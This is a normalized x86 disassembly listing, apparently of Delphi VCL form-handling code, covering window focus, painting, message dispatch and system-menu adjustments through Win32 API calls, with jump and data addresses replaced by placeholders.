mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_461960
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44ab60
push 0x0
mov eax ebx
call sub_44d7a4
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_4619a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44b2e4
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_461a08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_461ab0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ab7
lea eax [ ebp - 0x4 ]
call sub_404120
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
mov eax edi
call sub_45dd9c
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_40358c
mov eax ebx
call sub_461dc0
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_40358c
test al al
jne r-xdata
sub_461ac0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44a248
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44a248
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_461a08
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_461b08
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_461a08
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_461b2c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_41b7f0
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41b6d0
mov eax edi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_41b7f0
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41b6d0
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_461d9c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_44d7a4
mov dx 0xb000
call sub_45db64
test al al
jne r-xdata
call sub_44d7a4
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_45db64
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403c08
jmp r-xdata
call sub_403c08
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44a248
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_44d7a4
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_45db64
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_448138
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
call sub_403c08
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_44d7a4
mov dx 0xb01a
call sub_45db64
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403c08
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_448138
sub_461ccf
test esi edi
inc [ eax + eax * 8 + 0x36ebb374 ]
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_44d7a4
mov dx 0xb01a
call sub_45db64
test al al
jne r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
call sub_403c08
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_448138
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_448138
sub_461dc0
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_448138
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_44d7a4
push eax
call SetFocus
mov eax ebx
call sub_44d7a4
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_461e10
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_448138
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_461ec4
mov eax esi
call sub_461dc0
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_44dbcc
mov edx eax
mov eax esi
call sub_461a08
sub_461e74
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_460a8c
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_448138
mov eax ebx
call sub_460a8c
mov edx esi
call sub_461e74
sub_461ec4
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45ae48
mov edx esi
call sub_45ae2c
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_461f6c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40351c
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
sub_461fb8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_461f6c
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_461fe8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_461f6c
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_462054
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_427a5c
xor eax eax
push ebp
push sub_462102
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_427dd0
xor eax eax
push ebp
push sub_4620df
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_40358c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4620e6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_427dd0
retn
sub_462110
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_460a8c
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_460ac0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_40358c
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44ca34
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_460b0c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_40358c
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4621b0
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44d7a4
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_44d7a4
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_462038
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_44d7a4
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44b8fc
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_46222e
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_42763c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_462290
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44d7a4
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44bbc0
pop edi
pop esi
retn
sub_4622dc
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d7a4
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4623d8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_460e00
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4622dc
pop ecx
sub_46240c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_448654
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44d7a4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_44762c
pop esi
pop ebx
retn
sub_46249c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44d7a4
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44c9c0
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_44d7a4
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45a868
sub_4624fc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ba5c
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_45a27c
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_462548
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45aadc
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_462580
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_46261b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462622
lea eax [ ebp - 0x4 ]
call sub_404120
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_45a1dc
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4673e4
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_4440e8
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4673e4
jmp r-xdata
sub_462648
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_40358c
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_462688
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40d2f0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4626b4
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_461e74
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_443ec0
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_46270c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c8a4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_465cf0
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_40358c
sub_462798
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_44d7a4
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_462830
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44d7a4
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_461e10
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_40358c
sub_462888
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_44dcd8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_4628b4
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_461e74
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_4628d0
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_45a20c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_45a20c
sub_462910
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_462948
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_404174
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_46297c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_462acd
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ad4
lea eax [ ebp - 0x10 ]
call sub_404120
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_4628d0
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_443e64
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_419ff0
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_446a9c
lea eax [ ebp - 0x1c ]
call sub_406f00
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_4628d0
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_462910
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_467088
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_4670f0
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_4670f0
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_462948
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_419ff0
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_446a9c
lea eax [ ebp - 0x1c ]
call sub_406f00
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_467020
test [ esi + 0x228 ] 0x8
je r-xdata
sub_462adc
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
